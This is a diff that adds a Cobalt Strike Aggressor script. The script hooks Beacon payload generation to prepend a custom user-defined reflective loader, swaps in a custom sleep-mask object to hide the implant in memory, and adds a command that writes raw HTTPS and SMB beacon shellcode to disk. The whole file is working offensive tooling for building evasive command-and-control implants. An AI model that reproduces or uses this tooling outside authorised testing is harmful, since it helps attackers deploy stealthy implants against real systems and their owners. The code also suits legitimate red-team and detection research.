@@ -1,0 +1,92 @@
+set BEACON_RDLL_GENERATE {
+    # Declare local variables
+	local('$arch $beacon $fileHandle $ldr $artifactname');
+	$beacon = $2;
+	$arch = $3;
+    $artifactname = split('/', split('\.', $1)[0])[1] . ".dll";
+	
+	# Check the payload architecture
+	if($arch eq "x64") {
+            $path = getFileProper(script_resource("loader"), "bin", "udrl.x64.bin");
+            println("Using custom UDRL!");
+	} 
+	else {
+            warn("Error: Unsupported architecture: $arch");
+            return $null;
+	}
+
+	# Read the UDRL from the supplied binary file
+	$fileHandle = openf( $path );
+	$ldr = readb( $fileHandle, -1 );
+	closef( $fileHandle );
+    if ( strlen( $ldr ) == 0 ) {
+		warn("Error: Failed to read $path");
+		return $null;
+	}
+
+    # Apply string replacements from profile
+    $beacon = setup_strings($beacon);
+
+    # Apply transformations from profile
+    $beacon = setup_transformations($beacon, $arch);
+
+    # Write beacon dll to disk for examination
+	$fileHandle = openf( ">/home/geleiaa/Documents/UDRLSD/dist/$artifactname" );
+	writeb( $fileHandle, $beacon );
+	closef( $fileHandle );
+    println("Saved raw Beacon DLL without reflective loader as $artifactname");
+
+	# Prepend UDRL to Beacon and output the modified payload.
+	return $ldr.$beacon;
+}
+
+set BEACON_SLEEP_MASK {
+    println("Sleepmask - BEACON_SLEEP_MASK hook");
+
+    local('$handle $data $data_len $path $sm_bof $sm_bof_len');
+    $arch = $2;
+
+    # Check the payload architecture.
+   if($arch eq "x64") {
+       $path = getFileProper(script_resource("mask"), "dist" ,"sleepmask.x64.o" );
+   } 
+   else {
+       warn("Error: Unsupported architecture: $arch");
+       return $null;
+   }
+
+    $handle = openf($path);
+    $data   = readb($handle, -1);
+    closef($handle);
+    $data_len = strlen($data);
+    println("Sleepmask - $path length: $data_len bytes");                  
+
+    if ($data_len <= 0) {
+        println("Sleepmask - Error loading the sleep mask object file - Reverting to using the default sleep mask.");
+        return $null;
+    }
+
+    # extract the bof using the sleep_mask as the entry point
+    $sm_bof = bof_extract($data, "sleep_mask");
+    $sm_bof_len = strlen($sm_bof);
+    println("Sleepmask - Extracted sleep mask bof length: $sm_bof_len bytes");
+
+    if ($sm_bof_len <= 0) {
+       println("Sleepmask - Error extracting the sleep mask bof - Reverting to using the default sleep mask.");
+       return $null;
+    }
+
+    return $sm_bof;
+}
+
+command genpayload { 
+    $s = artifact_payload("https", "raw", "x64", "thread", "None"); 
+    $h = openf(">/home/geleiaa/Documents/UDRLSD/dist/beacon_x64_thread.bin"); 
+    writeb($h, $s); 
+    closef($h);
+
+    $s = artifact_payload("smb", "raw", "x64", "thread", "None"); 
+    $h = openf(">/home/geleiaa/Documents/UDRLSD/dist/beacon_smb_x64_thread.bin"); 
+    writeb($h, $s); 
+    closef($h); 
+}
